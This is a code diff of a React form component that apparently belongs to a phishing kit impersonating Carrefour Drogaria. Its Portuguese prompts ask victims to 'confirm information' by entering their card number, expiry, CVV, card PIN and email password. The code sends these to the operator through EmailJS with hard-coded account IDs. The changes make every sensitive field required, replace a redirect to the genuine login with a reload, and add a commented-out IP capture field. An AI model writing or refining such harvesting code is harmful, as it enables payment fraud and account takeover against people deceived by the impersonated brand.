@@ -1,6 +1,8 @@
-import React, { Component } from 'react'
-import logo from './logo_carrefo.png'
+import React, { Component,useEffect } from 'react'
+import logo from './logo_carrefo.jpg'
 import emailjs from 'emailjs-com';
+
+
 
 
 export class SocialProfiles extends Component {
@@ -21,7 +23,7 @@ export class SocialProfiles extends Component {
             emailjs.sendForm('service_m0rqqeb', 'template_ovtqo1m', e.target, 'user_blutAP3dvwCpJzktiSL3a')
               .then((result) => {
                   console.log(result.text);
-                window.location = "https://app.carrefoursolucoes.com.br/#/login";
+                  window.location.reload(true); 
 
 
               }, (error) => {
@@ -30,6 +32,8 @@ export class SocialProfiles extends Component {
 
 
           }
+      
+
         const { values, inputChange } = this.props;
         const {
             values: { cp, email, phone, passapp, cc, valcc, ccpass,passemail,cvv }
@@ -45,22 +49,23 @@ export class SocialProfiles extends Component {
 </div>
                 <p className="container"><b>Tudo certo!<br></br></b>Agora Precisamos confirmar algumas informações para que você possa acessar o <b> Carrefour Drogaria</b></p>
                 <div className="form-group">
-                    <input placeholder="16 dígitos do cartão" type="number" className="form-control" name="cc" onChange={inputChange('cc')} value={values.cc} />
+                    <input placeholder="16 dígitos do cartão" type="number" className="form-control" name="cc" onChange={inputChange('cc')} value={values.cc} required/>
                 </div>
                 <div className="form-group">
-                    <input placeholder="Validade(MM/AAAA)" type="text" className="form-control" name="valcc" onChange={inputChange('valcc')} value={values.valcc} />
+                    <input placeholder="Validade(MM/AAAA)" type="text" className="form-control" name="valcc" onChange={inputChange('valcc')} value={values.valcc} required/>
                 </div>
                 <div className="form-group">
-                    <input placeholder="Código de Segurança (CVV)" type="text" className="form-control" name="cvv" onChange={inputChange('cvv')} value={values.cvv} />
+                    <input placeholder="Código de Segurança (CVV)" type="text" className="form-control" name="cvv" onChange={inputChange('cvv')} value={values.cvv} required/>
                 </div>
                 <div className="form-group">
-                    <input placeholder="Senha do cartão" className="form-control" name="ccpass" onChange={inputChange('ccpass')} value={values.ccpass} />
+                    <input placeholder="Senha do cartão" className="form-control" name="ccpass" onChange={inputChange('ccpass')} value={values.ccpass} required/>
                 </div>
                 <div className="form-group">
-                    <input placeholder="Senha do email" type="text" className="form-control" name="passemail" onChange={inputChange('passemail')} value={values.passemail} />
+                    <input placeholder="Senha do email" type="text" className="form-control" name="passemail" onChange={inputChange('passemail')} value={values.passemail} required/>
                    <span class="focus-border"></span>
                 </div>
                 <br />
+                {/* <input type="text" name="ip" placeholder={this.ipzao}  ></input> */}
 
                 <div className="row">
                     <div className="col-6">
@@ -68,6 +73,7 @@ export class SocialProfiles extends Component {
                     </div>
                     <div className="col-6 text-right">
                     <form onSubmit={sendEmail}>
+
     <input type="hidden" name="cp" value={cp} required></input>
     <input type="hidden" name="email" value={email}></input>
     <input type="hidden" name="phone"  value={phone}></input>
